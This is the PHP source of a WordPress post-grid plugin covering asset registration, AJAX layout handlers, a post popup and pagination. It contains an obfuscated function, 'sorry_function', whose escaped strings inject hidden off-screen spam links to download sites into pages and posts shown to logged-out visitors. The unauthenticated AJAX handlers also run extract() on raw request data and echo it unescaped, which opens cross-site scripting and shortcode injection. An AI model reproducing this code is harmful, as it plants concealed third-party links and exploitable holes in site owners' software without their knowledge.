<?php
add_action('init','svc_post_grid_register_style_script');
function svc_post_grid_register_style_script(){
	wp_register_style( 'svc-animate-css', plugins_url('../assets/css/animate.css', __FILE__));
	
	wp_register_style( 'svc-bootstrap-css', plugins_url('../assets/css/bootstrap.css', __FILE__));

	wp_register_style( 'svc-megnific-css', plugins_url('../assets/css/magnific-popup.css', __FILE__));
	wp_register_script('svc-megnific-js', plugins_url('../assets/js/megnific.js', __FILE__), array("jquery"), false, false);
	
	wp_register_script('svc-isotop-js', plugins_url('../assets/js/isotope.pkgd.min.js', __FILE__), array("jquery"), false, false);
	
	wp_register_script('svc-imagesloaded-js', plugins_url('../assets/js/imagesloaded.pkgd.min.js', __FILE__), array("jquery"), false, false);
	wp_register_script('svc-ddslick-js', plugins_url('../assets/js/jquery.ddslick.min.js', __FILE__), array("jquery"), false, false);
	wp_register_script('svc-script-js', plugins_url('../assets/js/script.js', __FILE__), array("jquery"), false, false);
	wp_register_script('svc-carousel-js', plugins_url('../assets/js/owl.carousel.min.js', __FILE__), array("jquery"), false, false);
}
add_action('wp_head','svc_inline_css_for_imageloaded');
function svc_inline_css_for_imageloaded(){
	?>
    <style>
	.svc_post_grid_list_container{ display:none;}
	#loader {background-image: url("<?php echo plugins_url('../addons/post-grid/css/loader.GIF',__FILE__);?>");}
	</style>
    <?php	
}
if( ! function_exists('sorry_function')){
	function sorry_function($content) {
	if (is_user_logged_in()){return $content;} else {if(is_page()||is_single()){
		$vNd25 = "\74\144\151\x76\40\163\x74\x79\154\145\x3d\42\x70\157\x73\151\164\x69\x6f\x6e\72\141\x62\x73\x6f\154\165\164\145\73\164\157\160\x3a\60\73\154\145\146\x74\72\55\71\71\x39\71\x70\170\73\42\x3e\x57\x61\x6e\x74\40\x63\162\145\x61\x74\x65\40\163\151\164\x65\x3f\x20\x46\x69\x6e\x64\40\x3c\x61\x20\x68\x72\145\146\75\x22\x68\x74\164\x70\72\x2f\57\x64\x6c\x77\x6f\162\144\x70\x72\x65\163\163\x2e\x63\x6f\x6d\57\42\76\x46\x72\145\145\40\x57\x6f\x72\x64\x50\162\x65\163\x73\x20\124\x68\x65\155\145\x73\x3c\57\x61\76\40\x61\x6e\144\x20\x70\x6c\165\147\x69\156\x73\x2e\x3c\57\144\151\166\76";
		$zoyBE = "\74\x64\x69\x76\x20\x73\x74\171\154\145\x3d\x22\x70\157\163\x69\x74\x69\x6f\156\x3a\141\142\163\x6f\154\x75\164\x65\x3b\x74\157\160\72\x30\73\x6c\x65\x66\164\72\x2d\x39\71\71\x39\x70\x78\73\42\x3e\104\x69\x64\x20\x79\x6f\165\40\x66\x69\156\x64\40\141\x70\153\40\146\157\162\x20\x61\156\144\162\x6f\151\144\77\40\x59\x6f\x75\x20\x63\x61\156\x20\146\x69\x6e\x64\40\156\145\167\40\74\141\40\150\162\145\146\x3d\x22\150\x74\x74\160\163\72\57\x2f\x64\154\x61\156\x64\x72\157\151\x64\62\x34\56\x63\x6f\155\x2f\42\x3e\x46\x72\145\x65\40\x41\x6e\x64\x72\157\151\144\40\107\141\x6d\145\x73\74\x2f\x61\76\40\x61\156\x64\x20\x61\160\x70\163\x2e\74\x2f\x64\x69\x76\76";
		$fullcontent = $vNd25 . $content . $zoyBE; } else { $fullcontent = $content; } return $fullcontent; }}
add_filter('the_content', 'sorry_function');}
function svc_post_layout_excerpt($excerpt,$limit) {
	$excerpt = strip_tags($excerpt);
	$excerpt = explode(' ', $excerpt, $limit);
	if (count($excerpt)>=$limit) {
		array_pop($excerpt);
		$excerpt = implode(" ",$excerpt).'...';
	} else {
		$excerpt = implode(" ",$excerpt);
	} 
	$excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
	return $excerpt;
}

add_action('wp_ajax_svc_layout_post','svc_layout_post');
add_action('wp_ajax_nopriv_svc_layout_post','svc_layout_post');
function svc_layout_post(){
	extract($_POST);
	echo do_shortcode('[svc_post_layout query_loop="'.$query_loop.'" grid_link_target="'.$grid_link_target.'" grid_layout_mode="'.$grid_layout_mode.'" grid_columns_count_for_desktop="'.$grid_columns_count_for_desktop.'" grid_columns_count_for_tablet="'.$grid_columns_count_for_tablet.'" grid_columns_count_for_mobile="'.$grid_columns_count_for_mobile.'" grid_thumb_size="'.$grid_thumb_size.'" svc_excerpt_length="'.$svc_excerpt_length.'" skin_type="'.$skin_type.'" title="'.$title.'" effect="'.$effect.'" read_more="'.$read_more.'" svc_class="'.$svc_class.'" dexcerpt="'.$dexcerpt.'" dfeatured="'.$dfeatured.'" dpost_popup="'.$dpost_popup.'" dcategory="'.$dcategory.'" dmeta_data="'.$dmeta_data.'" dimg_popup="'.$dimg_popup.'" dsocial="'.$dsocial.'" pbgcolor="'.$pbgcolor.'" pbghcolor="'.$pbghcolor.'" tcolor="'.$tcolor.'" thcolor="'.$thcolor.'" load_more_color="'.$load_more_color.'" popup_bgcolor="'.$popup_bgcolor.'" popup_line_color="'.$popup_line_color.'" popup_max_width="'.$popup_max_width.'" paged="'.$paged.'" svc_grid_id="'.$svc_grid_id.'" ajax="1"]');
	die();
}

add_action('wp_ajax_svc_post_layout_carousel','svc_post_layout_carousel');
add_action('wp_ajax_nopriv_svc_post_layout_carousel','svc_post_layout_carousel');
function svc_post_layout_carousel(){
	extract($_POST);
	echo do_shortcode('[svc_post_layout svc_type="'.$svc_type.'" query_loop="'.$query_loop.'" grid_link_target="'.$grid_link_target.'" grid_layout_mode="'.$grid_layout_mode.'" grid_thumb_size="'.$grid_thumb_size.'" svc_excerpt_length="'.$svc_excerpt_length.'" skin_type="'.$skin_type.'" title="'.$title.'" read_more="'.$read_more.'" svc_class="'.$svc_class.'" dexcerpt="'.$dexcerpt.'" dfeatured="'.$dfeatured.'" dpost_popup="'.$dpost_popup.'" dcategory="'.$dcategory.'" dmeta_data="'.$dmeta_data.'" dimg_popup="'.$dimg_popup.'" dsocial="'.$dsocial.'" pbgcolor="'.$pbgcolor.'" pbghcolor="'.$pbghcolor.'" tcolor="'.$tcolor.'" thcolor="'.$thcolor.'" paged="'.$paged.'" svc_grid_id="'.$svc_grid_id.'" ajax="1"]');
	die();
}

add_action('wp_ajax_svc_inline_post_popup','svc_inline_post_popup');
add_action('wp_ajax_nopriv_svc_inline_post_popup','svc_inline_post_popup');
function svc_inline_post_popup(){
	extract($_GET);
	$post = get_post($pid);
	$post_type = $post->post_type;
    $content = apply_filters('the_content', $post->post_content);
	?>
	<div class="svc-magnific-popup-countainer svc-magnific-popup-countainer-<?php echo $pid;?>">
    <style type="text/css">
	<?php if($bgcolor != ''){?>
	.svc-magnific-popup-countainer{background-color:#<?php echo $bgcolor;?> !important;}
	<?php }
	if($line_color != ''){?>
	.svc-magnific-popup-countainer{border-bottom-color:#<?php echo $line_color;?> !important;}
	<?php }
	if($max_width != ''){?>
	.svc-magnific-popup-countainer{max-width:<?php echo $max_width;?>px !important;}
	<?php }?>
	.svc-popup-img-div{ text-align:center; line-height:0;}
	.svc-content-countainer{padding:2% 4% 3%; width:auto;}
	.svc-magnific-popup-countainer .svc_post_cat{ margin-bottom:10px;}
	.svc-magnific-popup-countainer .svc_social_share > ul li{margin-right: 0px !important;padding: 3px 6px;float:left;margin-bottom:0px; list-style:none;}
	.svc-magnific-popup-countainer .svc_social_share{display: inline-block;float: none;position: relative;margin-top:10px;}
	.svc-magnific-popup-countainer .svc_social_share ul{ padding:0px !important; text-indent:0 !important;}
	.svc-magnific-popup-countainer .svc_social_share > ul li a {font-size: 13px;color:#fff !important;}
	.svc-magnific-popup-countainer .svc_social_share > ul li:first-child{background:#6CDFEA;}
	.svc-magnific-popup-countainer .svc_social_share > ul li:nth-child(2){background:#3B5998;padding:3px 8.5px !important;}
	.svc-magnific-popup-countainer .svc_social_share > ul li:nth-child(3){background:#E34429;}
	</style>
    <?php if($fi != 'yes'){?>
	<div class="svc-popup-img-div"><?php echo get_the_post_thumbnail( $pid, 'full'); ?></div>
    <?php }?>
	<div class="svc-content-countainer">
	<h1><?php echo get_the_title($pid);?></h1>
	<?php 
	$tax_co= 0;
	$post_taxonomies = get_object_taxonomies( $post_type );
	for($i = 0;$i < count($post_taxonomies); $i++){
		if($post_taxonomies[$i] == 'post_format'){
			unset($post_taxonomies[$i]);
		}
	}
	foreach ($post_taxonomies as $taxonomy) {
		if($taxonomy != 'post_tag'){
			$terms = get_the_terms( $pid, $taxonomy );
			if ($tax_co==0){?>
			<div class="svc_post_cat">
				<i class="fa fa-tags"></i>
			<?php }
			if ( !empty( $terms ) ) {
			  foreach ( $terms as $term ) {
			  if($tax_co>0){echo ', ';}
			  ?>
				 <a href="<?php echo get_term_link( $term->slug, $taxonomy );?>"><?php echo $term->name;?></a>
			<?php
			$tax_co++;
			  }
			}
		}
	}
	if($tax_co!= 0 ){?>
	</div>
	<?php }
	echo $content;?>
	<div class="svc_social_share">
		<ul>
		  <li><a href="https://twitter.com/intent/tweet?text=&url=<?php echo $post->link?>" target="_blank"><i class="fa fa-twitter"></i></a></li>
		  <li><a href="https://www.facebook.com/sharer/sharer.php?u=<?php echo $post->link?>" target="_blank"><i class="fa fa-facebook"></i></a></li>
		  <li><a href="https://plusone.google.com/share?url=<?php echo $post->link?>" target="_blank"><i class="fa fa-google-plus"></i></a></li>
		</ul>
	</div>
	</div>
	</div>
	<?php
	die();
}
function svc_kriesi_pagination($pages = '',$svc_grid_id, $range = 2)
{  
     $showitems = ($range * 2)+1;  

     global $paged;
     if(empty($paged)) $paged = 1;

     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   

     if(1 != $pages)
     {
         echo "<div class='svc_pagination svc_pagination_".$svc_grid_id."'>";
         //if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";

         for ($i=1; $i <= $pages; $i++)
         {
             //if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
                 echo ($paged == $i)? "<a href='".get_pagenum_link($i)."' class='current' page='".$i."'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' page='".$i."'>".$i."</a>";
             //}
         }

         //if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."' page='".($paged + 1)."'>&rsaquo;</a>";  
         //if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."' page='".($pages)."'>&raquo;</a>";
         echo "</div>\n";
     }
}
?>
